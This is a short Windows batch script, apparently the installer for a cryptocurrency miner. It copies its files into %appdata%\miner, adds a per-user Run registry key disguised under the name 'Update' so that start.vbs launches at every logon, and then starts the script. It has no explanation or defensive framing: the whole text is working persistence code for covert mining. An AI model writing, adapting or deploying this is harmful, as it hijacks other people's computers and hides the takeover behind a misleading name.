SET INSTALLPATH="%appdata%"\miner
mkdir %INSTALLPATH%
copy *.* %INSTALLPATH%
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update" /d "\"%appdata%\miner\start.vbs" /f
%appdata%\miner\start.vbs